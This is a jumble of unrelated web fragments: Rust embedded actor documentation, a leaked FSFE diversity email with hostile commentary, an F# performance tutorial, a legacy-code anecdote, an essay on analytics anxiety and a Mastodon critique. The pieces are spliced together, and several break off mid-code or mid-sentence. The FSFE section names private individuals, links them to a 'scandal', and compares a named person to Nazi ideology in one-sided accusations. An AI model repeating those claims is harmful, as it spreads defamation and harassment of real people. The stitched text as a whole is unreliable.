<p>On the <code>Actor</code> side, as with the <code>NotifyHandler&lt;M&gt;</code>, there is a <code>RequestHandler&lt;M&gt;</code> trait to be implemented for each type of request an actor needs to be able to handle.</p>
<pre><code data-lang="rust"><span>pub struct </span><span>Lock;

</span><span>impl</span><span>&lt;T&gt; RequestHandler&lt;Lock&gt; </span><span>for </span><span>Mutex&lt;T&gt;
</span><span>where
</span><span>    T: </span><span>'static</span><span>,
{
    </span><span>type </span><span>Response = Exclusive&lt;T&gt;;

    </span><span>fn </span><span>on_request</span><span>(&amp;</span><span>'static mut </span><span>self</span><span>, </span><span>message</span><span>: Lock) -&gt; Response&lt;</span><span>Self::</span><span>Response&gt; {
        ... elided ...
    }
}
</span></code></pre><h3 id="interrupt-actors">Interrupt Actors</h3>
<p>Extending on the Plain Ol' Actors are Interrupt actors, which in addition to doing all the things an actor can do, <em>also</em> is cognizant and connected to hardware interrupts.
Interrupts are special, because they can arrive at any time, and they are not initiated as a message from another actor.
So interrupts are treated somewhat specially.</p>
<p>An interrupt firing can be considered a special type of message, without content. 
To that end, the <code>Interrupt</code> trait brings one more method to implement: <code>on_interrupt(...)</code>:</p>
<pre><code data-lang="rust"><span>impl</span><span>&lt;D, PIN&gt; Interrupt </span><span>for </span><span>Button&lt;D, PIN&gt;
</span><span>where
</span><span>    D: Device + EventHandler&lt;ButtonEvent&gt; + </span><span>'static</span><span>,
    PIN: InputPin + ExtiPin,
{
    </span><span>fn </span><span>on_interrupt</span><span>(&amp;</span><span>mut </span><span>self</span><span>) {
        ... elided ...
    }
}
</span></code></pre><h2 id="message-handling-and-async">Message-handling and <code>async</code></h2>
<p>Since Drogue Device attempts to provide guardrails for performing asynchronous operations where possible, but Rust doesn't currently support <code>async</code> in traits,
you may have noticed that all of the aforementioned <code>NotifyHandler&lt;M&gt;</code> and <code>RequestHandler&lt;M&gt;</code> methods were not, at all, <code>async</code>.
Additionally, their return value in the signatures may have appeared slightly odd.
Also, each method takes a <code>&amp;'static mut self</code> reference. 
It's <code>`static</code> because the system is static, and Futures work best with <code>`static`</code>. 
It's <code>&amp;mut</code> because the scheduler guarantees that the actor's methods are serialized and ensures that a given handler is the only reference (mutable or not) 
for the actor at any given point in time.
This allows the actor to free, without locks, mutate his own state.</p>
<h3 id="on-notify"><code>on_notify</code></h3>
<p>Let's look at the <em>fire-and-forget</em> <code>NotifyHandler&lt;M&gt;</code> on an actor.</p>
<pre><code data-lang="rust"><span>fn </span><span>on_notify</span><span>(&amp;</span><span>'static mut </span><span>self</span><span>, </span><span>m…</span></code></pre></section></div>

  <div itemprop="articleBody">
    <p>As the fallout of the <a href="https://fsfellowship.eu/court-case-fsfe-women-and-volunteers-face-modern-day-slavery/">FSFE stalking scandal continues</a>, we are publishing below the leaked FSFE diversity strategy.</p>

<p>Here are the highlights we identified:</p>

<blockquote><em>For the FSFE front page we asked women to provide quotes with picture:
 This worked for <a href="https://duckduckgo.com/?t=ffab&amp;q=Amaelle+Guiton&amp;ia=web">Amaelle</a>. Other female contributors were also initially
 interested in providing a quote, but other constrains prevented them
 from doing so.</em></blockquote>

<p>What is the real reason women don't want their name and picture on the FSFE web site?</p>

<blockquote><em>At our events we encourage female speakers, as well as new speakers,
 and from different countries (e.g. LLW, but also at the summit).</em></blockquote>

<p>FSFE's biggest event is LLW but it is never advertised.  The registration process and the Call for Papers are hidden from the former Fellows and the Supporters.  Women will not participate in other Free Software events as long as the biggest events, like LLW, are hidden in the shadows.</p>

<blockquote><em>For internships we meanwhile give preference to women.</em></blockquote>

<p>Women employed as interns, men employed on permanent contracts.  As the recent court case demonstrates, all women on permanent contracts were <a href="https://fsfellowship.eu/court-case-fsfe-women-and-volunteers-face-modern-day-slavery/">sacked for talking about equality</a>.  What Matthias Kirschner describes is analogous to the <a href="https://en.wikipedia.org/wiki/Untermensch">Untermensch concept from the Third Reich</a>.  This isn't the first time <a href="https://fsfellowship.eu/matthias-kirschner-fsfe-nazi-comparisons/">we find Kirschner's conduct is close to that of the Third Reich</a>.</p>

<p><img width="33%" alt="Olga Gkotsopoulou, FSFE, open source, intern, internship, Vrije Universiteit Brussel, VUB, law" src="https://fsfellowship.eu/assets/girlie-hacking-grey-front-large.jpg"></p><blockquote><em>we also encourage female interns to stay active in the
 FSFE after their internships:
 <ul>
 <li>We hired Polina (<a href="https://fsfellowship.eu/assets/fsfe-llw-conflict-of-interest.pdf">resigned after FSFE/LLW Conflict of Interest scandal</a>) after her internship</li>
 <li><b>Nikos is currently talking with <a href="https://duckduckgo.com/?q=Olga+Gkotsopoulou+fsfe+women+scandal&amp;t=ffab&amp;ia=web">Olga</a> about her becoming the Greek

is at the moment organising a Free Software event and
   coordinating with Matthias.</li>
 </ul>
</em></blockquote>

<p>Why would <a href="https://duckduckgo.com/?q=Olga+Gkotsopoulou+fsfe+women+scandal&amp;t=ffab&amp;ia=web">Olga Gkotsopoulou</a>, a woman from Greece, want to continue working for Free after her paid German internship ends?  Why would a woman in Greece want to send money to a misogynist in Berlin?  What will this Greek money be used for, hiring more female interns in Kirschner's cramped little office?</p>

<p>Kirschner appears to be delusional about his obligation to pay people.  An internship is a contract that ensures the woman can never acquire maternity rights, the contract always finishes before they can become pregnant.  Women resent this.</p>

<blockquote><em>### In Progress

</em><ul><em>
</em><li><em> Finish and implement Code of Conduct:
<ul>
 <li>Continue with the CoC, implement it, also against some critism (Erik
   worked on it with Heiki, but as it should be valid for the whole
   organisation so we said it would be good that we do not have several
   CoCs in the FSFE but try to merge it with the LLW CoC).</li>
  <li>help our groups to enforce it with a training about that topic next
   year (for the LLW Polina worked on a detailed guide what to keep in
   mind about that)</li>
</ul>
</em></li></ul></blockquote>

<p>This was the only definite action from the strategy, another Code of Conduct.  The way Kirschner <a href="https://fsfellowship.eu/court-case-fsfe-women-and-volunteers-face-modern-day-slavery/">went to this woman's home</a> demonstrates the reality of the Code of Conduct: leaders of open source organizations see themselves as God, they can do whatever they want and only apply their "enforcement" venom to their political rivals.</p>

<blockquote><em>
<p>Subject: Re: diversity and expanding the GA<br>
Date: Mon, 14 Aug 2017 10:51:58 +0000<br>
From: Matthias Kirschner <mk@fsfe.org><br>
To: ga@fsfeurope.org</mk@fsfe.org></p>

<p>Dear GA members,

</p><p>thank you all for raising your points in this thread. As Hugo pointed
out we repeatedly had that discussion, and also worked on some points.
Still there were some new ideas in the thread and from the Council we
suggest a few action items to make further progress. But first, so that
everybody is on the same page, some examples of existing activities on
that topic.,/p&gt;

</p><p>## Some examples of what we already do/did

</p><ul>
<li>When we have pictures on our website we try to have equal wo/man on
 them. For example have a look at
 https://fsfe.org/campaigns/ilovefs/whylovefs/gallery.en.html (this
 year we had some additions, before IIRC the ratio was better).</li>

<li>For the FSFE front page we asked women to provide quotes with picture:
 This worked for <a href="https://duckduckgo.com/?t=ffab&amp;q=Amaelle+Guiton&amp;ia=web">Amaelle</a>. Other female contributors were also initially
 interested in providing a quote, but other constrains prevented them
 from doing so.</li>
<li>At our events we encourage female speakers, as well as new speakers,
 and from different countries (e.g. LLW, but also at the summit).
 Although we have the same problem most conferences have, that is is
 really difficult to achieve that.</li>

<li>For the Legal Network council we started by picking the same ratio
 with men as with women.</li>

<li>For internships we meanwhile give preference to women. One reason is
 also because becoming intern is also increasing the chance to become
 an employment in the Free Software area.
 (https://fsfe.org/contribute/internship.en.html says "We want more
 women to be involved in Free Software. That's why we will give
 preference to applications from suitably qualified female
 candidates.")</li>

<li> As with males we also encourage female interns to stay active in the
 FSFE after their internships:
 <ul>
 <li>We hired Polina (<a href="https://fsfellowship.eu/assets/fsfe-llw-conflict-of-interest.pdf">resigned after FSFE/LLW Conflict of Interest scandal</a>) after her internship</li>
 <li>Nikos is currently talking with <a href="https://duckduckgo.com/?q=Olga+Gkotsopoulou+fsfe+women+scandal&amp;t=ffab&amp;ia=web">Olga</a> about her becoming the Greek
   deputy coordinator.</li>
 <li>With <a href="https://duckduckgo.com/?t=ffab&amp;q=lucile+falgueyrac+fsfe&amp;ia=web">Lucile</a> we have regular contact and invite her to meetings (she
   has very little time).</li>
 <li>We work a lot with <a href="https://duckduckgo.com/?t=ffab&amp;q=Eszter+Bako+fsfe&amp;ia=web">Eszter</a>, who is now assistent of <a href="https://en.wikipedia.org/wiki/Julia_Reda">Julia Reda</a>, but
   it might be difficult to include her further at the moment.</li>
 <li><a href="https://duckduckgo.com/?t=ffab&amp;q=Lusy+Vaseva+fsfe">Lusy</a>
is at the moment organising a Free Software event and
   coordinating with Matthias.</li>
 </ul></li>

<li>Staff was following-up with proposals from the past. For example
 Patrick Ohnewein before proposed Sonia Montegiove. Matthias had
 several talks with her and invited her to the FSFE summit. The problem
 is that she is quite shy when speaking English.</li>
<li>This year we had a
moderations workshop for our staff. Before it we
 clarified with the trainer that one of our goals is to enable our
 staff running more inclusive meetings. The workshop was documented in
 the wiki https://wiki.fsfe.org/Internal/Moderation (some permission
 problem at the moment, hope it is soon fixed).</li>
</ul>

<p>## Next Steps</p>

<p>### In Progress</p>

<ul>
<li> Finish and implement Code of Conduct:
 <ul>
 <li> Continue with the CoC, implement it, also against some critism (Erik
   worked on it with Heiki, but as it should be valid for the whole
   organisation so we said it would be good that we do not have several
   CoCs in the FSFE but try to merge it with the LLW CoC).</li>
 <li>help our groups to enforce it with a training about that topic next
   year (for the LLW Polina worked on a detailed guide what to keep in
   mind about that).</li>
  </ul>
</li>
</ul>

<p>### Possible actions</p>

<ul>
<li>Discussion with Ulrike about the topic. She studied gender studies and
 is very interested in the topic) about the topic. Together with her
 identify strategies for more diversity inside the FSFE community and
 the GA, by</li>
<ul>
<li>having a budget for counselling on diversity (as several
people
   pointed out, just because someone is a women in IT, does not know
   they know about diversity).</li>
<li> have a time budget for Ulrike to
help on this issue next year.</li>

<li> As some hesitate to just add women to the GA without first being
 involved in other areas, make it a priority to support already active
 or interested females (or other under represented groups).  * This
could include that we encourage them to join us in teams, and
   mentor them, or to invite them to events so we can meet them (could
   also include priority for travel funding in case we have to choose).
</li></ul>

<li>GA participation:
<ul><li>You might have realised that all our male
staffers are GA members,
   but none of our female staffers is. That is bad. We should encourage
   Polina and Ulrike to think about joining, too.</li>
 <li>Depending on the outcome of the FSFE2020 discussion: if we enlarge
   the council (as the FSFE board) introduce a quote there (as Daniel
   proposed to have a second VP position, with a requirement that at
   least one of the VP positions must not be male.)</li>
 <li>Depending on the Italian GA member's feedback, we could invite her
   as a guest to the next GA, or if they think it would be a good idea
   we can ask her to first become another coordinator for Italy as a
   first step.</li>
  </ul></li>

<li>https://fsfe.org/contribute/internship.en.html starts with a quote by
 a former male and female interns. But we should update one of the
 quotes by Erik or Hugo on that page with former quotes.</li>

<li>Make sure we have balanced quotes by women on our website / as well as
 the front page. E.g.
 https://fsfe.org/campaigns/ilovefs/whylovefs/whylovefs.en.html (either
 get more or think about removing this page for next years in the
 campaign)</li>
</ul>

<p>Best Regards,<br>
Matthias</p>

<br/>
February 3, 2021 | https://bartoszsypytkowski.com/writing-high-performance-f-code/ | <a href="https://web.archive.org/web/*/https://bartoszsypytkowski.com/writing-high-performance-f-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

		<!-- .post-header -->


		<div>
			<!--kg-card-begin: markdown--><p>While this post is addressed to F# .NET developers, it introduces much wider concepts starting from hardware architecture to overall .NET runtime and JIT compiler optimizations. It shouldn't be a surprise - optimizing the application performance requires us to understand the relationships between our high level code and what actually happens on the hardware.</p>
<p>There's a popular opinion that F# code must be slower than equivalent C# code. This opinion is mostly false, however it comes with some rationale. Usually comparison doesn't use <strong>equivalent</strong> code in both languages, and F# is generally more high level and declarative in nature. "Idiomatic" F# code doesn't always play well with .NET virtual machine. Writing code that is high level, declarative and fast on .NET platform is not an easy task.</p>
<p>In the examples below we'll use some common tools that will help us get better insight into nature of F# code:</p>
<ul>
<li><a href="https://sharplab.io/">Sharplab</a> allows us to easily inspect generated JIT intermediate representation, assembly or even equivalent C# code (which sometimes is approximate, since not all IL idioms are representable in C#) for a given F# snippet. For assembly code usually some extra mangling with params may be necessary for code to be generated as SharpLab sometimes cannot introspect F# core lib code.</li>
<li><a href="https://github.com/SergeyTeplyakov/ObjectLayoutInspector">Object Layout Inspector</a> lets us see how structs and classes will actually be represented in memory.</li>
<li><a href="https://benchmarkdotnet.org/articles/overview.html">BenchmarkDotNet</a> is very popular library for writing micro benchmarks. We'll use it to show heap allocations and execution times of our code.</li>
</ul>
<p>A correct profiling of the executing application is crucial before starting any work on optimizing the code - there's no sense in shaving last possible CPU cycles out of the function that's executed for 0.1% of the time.</p>
<p>Keep in mind that for most day-to-day business applications, first way to solve performance problems is to reduce obvious mistakes (eg. replacing multiple I/O requests with one, writing more efficient database query etc.). If that was not the case, next step for satisfactory solution can be simply writing more imperative code - to make it easier to reason about for the compiler rather than human - or picking better-suited data structures. This is especially prevalent in F#, where we can observe pervasive usage of types like <code>'t list</code> (tip: if you're looking which collection to use and want good performance, F# list is almost never a good answer). Here we're about to go deeper, into area where we're about to compete with the prefabricated data types and algorithms.</p>
<h2 id="understandmemorylayoutofvaluetypes">Understand memory layout of value types</h2>
<p>One of the big performance gains, that .NET runtime uses to take advantage over other managed virtual machines (like JVM) in race for ultimate performance, often comes from using value types. So if we're about to go fast, we first need to understand how they work.</p>
<p>.NET structs represent types, which are not allocated separately on the managed memory heap, but rather inlined within the containing scope (instance of the class in case of fields, thread stack for variables, etc.). This means that usually they are cheaper and easier to access in high-allocation scenarios.</p>

<p>Historically, F# code was not very promising, when it comes to utilizing value types. Nowadays we got things like struct tuples - <code>struct('a * 'b)</code> which unfortunately are not widely used in F# even though in practice they should be preferable choice when working with tuples - and <code>[&lt;Struct&gt;]</code> attribute, that can be used on records and discriminated unions (we'll return to them later), making use of them became much more feasible.</p>
<p>However this doesn't necessarily mean, that replacing all reference types with value types will make our code magically go faster. In fact, this may be quite opposite. Why? Imagine what happens when we want to pass a record as a parameter. How is it done? Usually passing object to a function happens by copying reference to that object, which is either 4B or 8B depending on our OS being x86 or x64, and therefore fits perfectly into standard CPU register.</p>
<pre><code>type A() =
  class
    [&lt;DefaultValue&gt;] val mutable x: int
    [&lt;DefaultValue&gt;] val mutable y: int
    [&lt;DefaultValue&gt;] val mutable z: int
  end

let print (value: 't) = System.Console.WriteLine(value.ToString())

let a = A() // sub rsp, 0x28
            // mov rcx, 0x7ff91b23d1a8
            // call 0x00007ff9730aade0 ; allocate A on the heap
print a     // mov rdx, rax            ; copy reference to a to the stack
            // mov rcx, 0x7ff91b23d5f8
            // call _.print[[System.__Canon, System.Private.CoreLib]](System.__Canon)
</code></pre>
<p>Now what if we're using structs? For reference types we copy object's reference on the stack - since reference is just a single address, it always can fit into register and be done within a single operation. For value types, we copy entire value instead. If they don't fit into register, we'll have to copy them over in multiple steps.</p>
<pre><code>type B =
  struct
    [&lt;DefaultValue&gt;] val mutable x: int
    [&lt;DefaultValue&gt;] val mutable y: int
    [&lt;DefaultValue&gt;] val mutable z: int
  end

let b = B() // sub rsp, 0x38
            // xor eax, eax       ; zero field b.x
            // xor ecx, ecx       ; zero field b.y
            // xor edx, edx       ; zero field b.z
print b     // lea r8, [rsp+0x28]
            // mov [r8], ecx      ; copy field b.x to the stack
            // mov [r8+4], eax    ; copy field b.y to the stack
            // mov [r8+8], edx    ; copy field b.z to the stack
            // lea rcx, [rsp+0x28]
            // call _.print[[_+B, _]](B)
</code></pre>
<p>Each of these steps is a machine instruction that takes time to execute. However, sometimes .NET can optimize that - pointer-sized registers are not only ones available in modern machines. We also have a special purpose SIMD (Single Instruction Multiple Data) ones, that are much bigger and can be used as long as passed data fits into them perfectly.</p>
<pre><code>type C =
  struct
    [&lt;DefaultValue&gt;] val mutable x: int
    [&lt;DefaultValue&gt;] val mutable y: int
    [&lt;DefaultValue&gt;] val mutable z: int
    [&lt;DefaultValue&gt;] val mutable zz: int
  end
  
let c = C() // sub rsp, 0x48
            // xor eax, eax             ; zero register
            // mov [rsp+0x38], rax      ; init fields b.x and b.y together with zero'ed register
            // mov [rsp+0x40], rax      ; init fields b.z and b.zz together with zero'ed register
print c     // vmovupd xmm0, [rsp+0x38] ; copy all 4 fields together on the stack using SIMD registers
            // vmovupd [rsp+0x28], xmm0
            // lea rcx, [rsp+0x28]
            // call _.print[[_+C, _]](C)
</code></pre>
<p>Another thing available in .NET, that allows us addressing inefficiencies of passing structs as arguments are so called by-ref parameters. There are 3 types of these, marked using <code>'t inref</code>, <code>'t outref</code>  and <code>'t byref</code>:</p>
<pre><code>let print(value: 't inref) = ...
let c = C()
print &amp;c // lea rcx, [rsp+0x28] ; copy address of the struct head onto the stack
         // call _.print[[_+C, _]](C ByRef)
</code></pre>
<p>Please, don't confuse by-ref parameters with <code>ref</code> data type:</p>
<ul>
<li><code>'a ref</code> is actually an alias for <code>Ref&lt;'a&gt;</code> class, therefore allocated on the heap and passed by reference. In general, using this class in F# very rarely has sense (outside of writing exemplar, idiomatic code).</li>
<li><code>'a byref</code> is equivalent to C# <code>ref</code> parameter tag - it means that we're passing reference (memory address) to an object or struct. It expects it to be initialized and can be used to change the contents of the underlying value. For this reason F# requires fields and variables passed as <code>byref</code> to be declared with <code>mutable</code> keyword.</li>
<li><code>'a outref</code> is equivalent to C# <code>out</code> parameter tag - it always must be initialized by the end of the function body. This may sound a bit tricky as F# doesn't put that requirement explicitly. If we didn't make that assignment in any of the code branches, F# compiler will simply initialize it for us with default value (just like using <code>Unchecked.defaultof&lt;_&gt;</code>), which sometimes may lead to null reference exceptions.</li>
<li><code>'a inref</code> is the youngest of these and is equivalent of C# <code>in</code> parameter - while in C# structs passed as arguments for that parameters don't have to be tagged,  F# will always require to mark passing by ref (using <code>&amp;</code> prefix for passed argument) for any parameter marked with <code>byref</code>/<code>inref</code>/<code>outref</code>. <code>inref</code> is basically an optimization technique for what we saw above - it allows us to pass struct into a function using only its memory address, without copying entire struct contents. Additionally <code>inref</code> says that parameter is treated as read only, so it cannot be modified inside of function body. .NET JIT can utilize this information in some cases to reduce number of safety checks, therefore reducing number of instructions to be executed.</li>
</ul>
<p>While using by-ref parameters is usually good idea when it comes to writing code targeting complex value types, there are several limitations to it.</p>
<p>One is that arguments passed using by-ref params cannot be captured by closures/lambdas/anonymous functions, which prevents them from being used in more abstract code:</p>
<pre><code>// WRONG!
let doSomething (a: int inref) =
  [1..10]
  |&gt; List.map (fun x -&gt; x + a) // `a` is captured by closure, which is compilation error
  
// RIGHT
let doSomething (a: int inref) =
  let mutable result = []
  for x=10 downto 1 do
    result &lt;- (x + a)::result
  result
</code></pre>
<p>This includes problems even for common inlined functions like eg. pipe operator <code>|&gt;</code>. That's the price, we have to pay for speed (at least for now).</p>
<p>Second issue is that, at the moment by-ref parameters cannot be involved in building nested functions (regardless if they capture the values from function in outer scope or not). This again makes very inconvenient to use them in cases like tail recursive loop pattern:</p>
<pre><code>// WRONG!
let doSomething (a: 'a) =
  let rec loop n (x: 'a inref) = // this nested function won't compile
    if n = 0 then ()
    else loop (n-1) &amp;x
  loop 100 &amp;a

// RIGHT
let rec loop n (x: 'a inref) =
  if n = 0 then ()
  else loop (n-1) &amp;x
  
let doSomething (a: …</code></pre></div></article></div>

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>A certain business process had been automated three years before. A small team of engineers had formed around a business need to meet some legal compliance issues, wrote the first version, and then left it in the hands of a product team that included one of the initial engineers.</p>

<p>It was plain sailing for a few years. The code expanded to automate more aspects of the compliance problem, and a third party system integrated to handle some issues that were not first-class concerns of the business logic. The team proceeded naturally, with some members leaving, and others taking over.</p>

<p>The first crack was that the third party system didn’t catch on with other parts of the business (even though it was widely applicable). Therefore, fewer candidates with good contextual knowledge remained in the face of natural attrition. Attrition was worrying, accelerated by some interpersonal issues and the standard flow of enquiries from hiring competitors.</p>

<p>The apparent saving grace against attrition were the contractors who had been present for the maintenance of this code. They appeared happy, and the relationship between the customer and client was strong, so they weren’t going anywhere.</p>

<p>When the last internal person left, the contractors became more isolated from the rest of the business. Three internal product owners engaged with the space and eventually moved on, but these contractors soldiered on, albeit with less oversight and awareness of the broader technical goals of the company.</p>

<p>Unfortunately, the business hit funding difficulties when the VC darling of the local tech community pulled out of a <em>signed</em> term sheet because of a global investment crisis. This VC presented themselves as the saviour of local startups during that crisis, but a dark possibility is that they thought that the company could be bought for a better price after the crisis did some shaking.</p>

<p>All contractors (and a third of the permanent workforce) were out within a month of the deal failing, leaving no-one who knew the code.</p>

<p>Four engineers found themselves in the space vacated by two teams, looking after various systems including this code. Over months they pieced together a picture of how it was supposed to work, learning (amongst other things) that the process had been broken for months before they took over. Fixes went in, and increased monitoring was added.</p>

<p>Unfortunately attrition had not taken a break during the crisis: ten months later one departure, another pending resignation, an extended period of leave for a third member, and a hiring freeze left the team poorly positioned for the ongoing flood of production issues.</p>

<p>The two available members soldiered on, trying to make sure that the old code would be safe with fewer and fewer people available to maintain it (if you’re counting, the two would soon be reduced to one after a completed notice period).</p>

<p>One day, this code didn’t produce what was expected. The process needed to be complete by Saturday at 5pm, or lawyers had to get involved. It was Friday at 3pm, and one of the members was expecting to celebrate his partner’s 30th birthday the next day.</p>

<p>He left at 5pm on Friday, grateful for his teammate’s willingness to handle the problem for what would still (he assumed) be a few hours, and enjoyed a pleasant evening of birthday events with the family.</p>

<p>The next morning, he woke to see that the other teammate had been working all night on the problem and couldn’t continue. The happy path was fixed, but the lawyers would still need to get involved for the exceptions. With a few hours effort he believed he had a fighting chance of tracking down the exceptions, but again, it was his partner’s birthday.</p>

<p>Distracted by party preparations, it was not a good time to deal with: logging that was unfamiliar and slow to search; builds that took 45 minutes to get anything into production; flaky tests; data investigation tools that took hours to fetch the necessary data (and it was later realised, would have produced the wrong data); and some poor abstractions from years of maintenance without strong awareness of the big picture.</p>

<p>What should have been a simple matter (read some logs, run some code based on the results) ended up going nowhere. Eventually the truth had to be faced: they’d pick this up on Monday, with or without the lawyers.</p>

<p>The moral is related to frequent engineering decisions. Is your code understandable and resilient, are errors easily understood and recoverable, are builds are fast and stable, are feedback loops fast enough to learn and make change? Is your system isolated in a way that will reduce the number of people who can contribute usefully?</p>

<p>When you make these decisions, consider that it will not be you in your current context, with your current teammates for whom it matters.</p>

<p>It will matter a year or more after you and all your teammates are gone, when the person using all this has worked through the night, or is severely distracted by important, once-in-a-liftetime family events. It will matter when lawyers need to get involved if things go wrong, and it will matter when the company has less money to spend on tech than it does now.</p>

<p>There are a few caveats here:</p>

<p>First, companies sometimes make the decision to grow today at the expense of sustainability because there will be no point in sustainability if the business does not exist tomorrow. Product leaders or management may even oppose some of these ideas for this reason. I feel fortunate that in my current role, people are particularly receptive about ideas on how to avoid disasters, but it was not always like this.</p>

<p>Less charitably, middle management may be ignorant of the consequences, and their incentives are also often out of line with long running systems. They may even be consciously aware that the next rung of the ladder will come before they would have to deal with the consequences of making unsustainable decisions.</p>

<p>As engineers it often falls to us to educate people on the benefits of “non-feature” work. Ideally things like fast feedback loops will make you grow faster, as well as being more sustainable in the long term, but people who have not seen this work may struggle to understand.</p>

<p>Lastly, no single person’s decisions matter on their own, because that person will not be around to see the results. What matters is that there is a culture that can push everyone in a healthy direction.</p>

We track every single thing that’s trackable; page visits, followers, impressions, likes, shares, diet, sleep, dream, sex, calories — everything. While the use of analytics is valid in some cases, were we such analytics freaks just a decade ago?</span></span></p><h2 id="block-9a6cf2f7e066445cbd212ba79104e402"><span id="9a6cf2f7e066445cbd212ba79104e402"></span><span><span><strong>Anxiety</strong></span></span></h2><p><span><span>Analytics overload leads to unnecessary anxiety. When people share their supposedly impressive stats online, we instinctively compare theirs to our own. If we are better, we flaunt. If we are lesser, we feel stressed out. Rarely do we ever feel content. This is normal because we are not angels. However, we can learn to minimize this unnecessary anxiety and lead a happier, calmer life.</span></span></p><p><span><span>A simple way to reduce analytics anxiety is to avoid it altogether. Your personal site doesn’t need an analytics script. Your casual blog site doesn’t need an analytics script. You don’t need to visit your app’s analytics page every day. You don’t need to track your REM cycle when you sleep. Remove all of them, and you will see a difference in your life within just a few days. You will have more time to yourself and feel more positive.</span></span></p><p><span><span>Sometimes, it is inevitable when your social media friends share something analytics related like Twitter followers count and Gumroad payments. It is not a bad thing per se because it can motivate you to work harder. However, try your best not be too concerned with it. Either ignore or wish them good. Fill your feed with things you enjoy instead, like sports or science. Focus on making yourself happy rather than comparing your life to others.</span></span></p><p><span><span>If you really need to use analytics, set aside a time to study it. Once that time is up, remove the analytics tab from your view because it will be a distraction to you. If you are using analytics for your websites, I'd recommend using something like </span><span><a href="http://plausible.io/" target="_blank" rel="noopener noreferrer">Plausible.io</a></span><span> or </span><span><a href="http://simpleanalytics.com/" target="_blank" rel="noopener noreferrer">simpleanalytics.com</a></span><span>. One notable feature that they offer is an email summary of your sites' performance for each week or month. This is great because now you don't need to check in as often.</span></span></p><h2 id="block-b5666e09bbeb43d48ea1583005bbd0dd"><span id="b5666e09bbeb43d48ea1583005bbd0dd"></span><span><span><strong>Noise</strong></span></span></h2><p><span><span>Realize that analytics wasn’t even a thing a decade or more ago. Life was calmer and less competitive for attention. We managed to diet well, sleep soundly, and build healthy businesses without a care about analytics. Analytics is the new noise, and we should try to plug our ears whenever possible.</span></span></p><p><span><span>Despite writing this, I was, and still am guilty of being an analytics freak. But I’m doing my best to minimize my obsession and revert to how I was in the 2000s when life was evidently calmer. Oops, did I just give away my age?</span></span></p><p><span><span><code>Happy to chat</code></span></span></p><ul><li id="block-e7e22e9ff6cf4edaa608c694aca55a7b"><span><span>Tweet me on </span><span><a href="https://twitter.com/yusufgiftworks" target="_blank" rel="noopener noreferrer">Twitter</a></span></span></li></ul></article></div></div></div>]]>

	<!-- .entry-header -->

	
		<div>
			
<p>I am 100% serious with the title, despite the appearance of click-bait. Mastodon has a serious structural rot that is only worsening as time gets on. I think this is for a few reasons which I will outline below.</p>



<p>Ironically, I don’t feel safe posting this directly to the fediverse because of the very forces I’m about to describe. I’m not worried about the cancel crew, I just don’t want to deal with hostile interactions right now. I might link to this post but it’s less likely to get hate mail I suspect if I do it that way rather than write this all up in a giant thread on fedi.</p>



<p>What I am presenting is largely anecdotal opinion, although it has been gathered from countless others (I’m not going to name any names, they deserve better than harassment or people trying to change their views and in the process merely reinforcing them).</p>



<h2>Background on myself</h2>



<p>I’ve been on Mastodon since April 2017. I was on “fedi” (well, the ostatus fediverse) before that, on long-gone instances I forgot the name of. I was on Mastodon in the very early days of its development, when content warnings were brand new, blocking/silencing was seriously broken, and fedi was just getting exciting due to press coverage. Before this, I was on IRC since 2005 and an IRC operator on a small network (it’s not glamorous, trust me).</p>



<h2>The problem</h2>



<p>Fedi has a problem as the title says: it’s crumbling. It’s a lot less vibrant than when I joined up, even back when GNUSocial roamed the earth (it was a pile of shit trying to imitate Twitter and mostly filled with people banned from Twitter for GamerGate and going too far, even for Twitter’s lax standards of the day).</p>



<p>It actually baffles me why so much of the Mastodon userbase can be traced back to the Tumblr/Twitter leftist crowd, when Fedi’s beginnings were on a network largely consisting of ultra-right people thrown off Twitter. I can only speculate, but I suspect the main reasons are they believed they would be safer (which is a joke), and many themselves (or their friends at least) were banned from those platforms for similarly shitty behaviour.</p>



<p>But it’s a mistake to believe that Fedi is safer at all. In fact, in many ways, it’s worse.</p>



<h3>Fedi is the least safe place around</h3>



<p>The thing about Fedi is that due to its nature, it has a low bar to entry. Anyone can make an instance at any time for not a whole lot of money. There are tons of far-right instances littering the place, and few admins can truly keep up (the worst-kept secret amongst Mastodon admins I would say). Most of the userbase just blocks them on an ad-hoc basis and moves on (or doesn’t notice them), but the fact that the Nazis haven’t really taken over the place is only by their mere incompetence.</p>



<p>To illustrate the problem, I will tell you about this: the largest instance on the Fediverse.</p>



<p>Oh, no, not mastodon.social. They’re big, but not as big as the largest. The largest is Pawoo, with around a million users last I checked. It’s owned by Pixiv, a Japanese company (think Japanese DeviantArt). And if Fedi knew even a rudimentary level of Japanese (this would require widespread non-Western cultural awareness they do not possess), they wouldn’t have joined in the first place. Japanese nationalism is everywhere on Pawoo, and the admins largely don’t care (granted: I don’t pay much attention to it and filtered it a long time ago, this may not be the case any longer). There is a certain irony I love about the largest Fedi instance being a commercial entity, despite the English speakers of the Fediverse largely eschewing corporations and brands. They also allow loli and (fictional) artwork of children, which is not banned in Japan but is a grey area in the US as advised by legal counsel for IF (I personally don’t want to test it, if you want to, have fun, leave me out of it).</p>



<p>Pawoo mostly sits there, under the radar, because they don’t speak English, and many instances blocked them a long time ago (I remember the great Pawoo discourse of 2017). There are tons and tons of other instances that most people don’t even know about that spew things that are far worse.  We at mst3k actually have <a href="https://mst3k.interlinked.me/about/more" target="_blank" rel="noreferrer noopener">a pretty big list</a>, and it ain’t even close to how many are actually out there. I just block them as I see them. Granted, many of those instances are long-gone, but there are many more to replace them.</p>



<h3>The faux-woke crowd is making fedi less safe</h3>



<p>I know this one is going to get me flamed and called racist or whatever the fuck, but so be it.</p>



<p>Now, full disclosure: I am partially Romani, Native American, but mostly (and certainly culturally raised) white, but <a href="https://weirder.earth/@WeirderAdmin/105640549522292568" target="_blank" rel="noreferrer noopener">I’ve listened to what other PoC have to say on this matter.</a></p>



<p>Fedi has a really bad problem: race-based trolling. There is a huge contingent on Fedi that is taking advantage of white guilt to troll the ever-loving fuck out of people.</p>



<p>I know this sounds like an amusing thing and is very much a “so what, they’re white” moment.  But I assure you, it’s anything but funny, and it’s causing minorities to be shed from Fedi.</p>



